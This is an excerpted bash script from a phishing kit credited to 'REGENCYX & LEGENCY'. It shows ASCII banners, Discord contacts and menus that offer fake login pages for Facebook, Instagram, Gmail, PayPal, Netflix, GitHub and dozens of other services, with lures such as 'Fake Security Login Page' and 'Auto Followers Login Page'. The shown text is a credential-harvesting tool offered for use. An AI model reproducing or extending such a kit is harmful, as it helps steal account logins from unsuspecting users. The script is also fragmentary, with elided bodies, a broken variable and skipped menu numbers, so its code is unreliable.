...
banner() {
	cat <<- EOF
		...
		${GREEN} Make Project by R E G E N C Y X & L E G E N C Y
	EOF
}
...
banner_small() {
	cat <<- EOF
		${GREEN}  _______       ________       ______       ________      __    __       ______       __      __      __    __ 
		${GREEN} |       \     |        \     /      \     |        \    |  \  |  \     /      \     |  \    /  \    |  \  |  \
		${GREEN} | ▓▓▓▓▓▓▓\    | ▓▓▓▓▓▓▓▓    |  ▓▓▓▓▓▓\    | ▓▓▓▓▓▓▓▓    | ▓▓\ | ▓▓    |  ▓▓▓▓▓▓\     \▓▓\  /  ▓▓    | ▓▓  | ▓▓
		${GREEN} | ▓▓__| ▓▓    | ▓▓__        | ▓▓ __\▓▓    | ▓▓__        | ▓▓▓\| ▓▓    | ▓▓   \▓▓      \▓▓\/  ▓▓      \▓▓\/  ▓▓
		${GREEN} | ▓▓    ▓▓    | ▓▓  \       | ▓▓|    \    | ▓▓  \       | ▓▓▓▓\ ▓▓    | ▓▓             \▓▓  ▓▓        >▓▓  ▓▓ 
		${GREEN} | ▓▓▓▓▓▓▓\    | ▓▓▓▓▓       | ▓▓ \▓▓▓▓    | ▓▓▓▓▓       | ▓▓\▓▓ ▓▓    | ▓▓   __         \▓▓▓▓        /  ▓▓▓▓\ 
		${GREEN} | ▓▓  | ▓▓    | ▓▓_____     | ▓▓__| ▓▓    | ▓▓_____     | ▓▓ \▓▓▓▓    | ▓▓__/  \        | ▓▓        |  ▓▓ \▓▓\
		${GREEN} | ▓▓  | ▓▓    | ▓▓     \     \▓▓    ▓▓    | ▓▓     \    | ▓▓  \▓▓▓     \▓▓    ▓▓        | ▓▓        | ▓▓  | ▓▓
		${GREEN} \▓▓   \▓▓     \▓▓▓▓▓▓▓▓      \▓▓▓▓▓▓      \▓▓▓▓▓▓▓▓     \▓▓   \▓▓      \▓▓▓▓▓▓          \▓▓         \▓▓   \▓▓
	EOF
}
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}DISCORD : Regencyx#0001
		${GREEN}DISCORD : Legency#1235
		${GREEN}DISCORD SERVER : https://www.discord.io/LegencyH4ck
...
site_facebook() {
	cat <<- EOF
		...
		${BLUE} Traditional Login Page
		${BLUE} Advanced Voting Poll Login Page
		${BLUE} Fake Security Login Page
		${BLUE} Facebook Messenger Login Page
...
site_instagram() {
	cat <<- EOF
                  ${ORANGE} Traditional Login Page
                  ${ORANGE} Auto Followers Login Page
                  ${ORANGE} 1000 Followers Login Page
                  ${ORANGE} Blue Badge Verify Login Page
...
site_gmail() {
	cat <<- EOF
                  ...
                  ${YELLOW} Gmail Old Login Page
                  ${YELLOW} Gmail New Login Page
                  ${YELLOW} Advanced Voting Poll
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${BLUE} Facebook           ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram        ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${YELLOW} Google           ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${YELLOW} Microsoft        ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${RED} Netflix             ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${BLUE} Paypal             ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress 	
		${RED}[${WHITE}08${RED}]${BLUE Twitter             ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
	    ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok           ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
        ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab           ${RED}[${WHITE}33${RED}]${ORANGE} Github
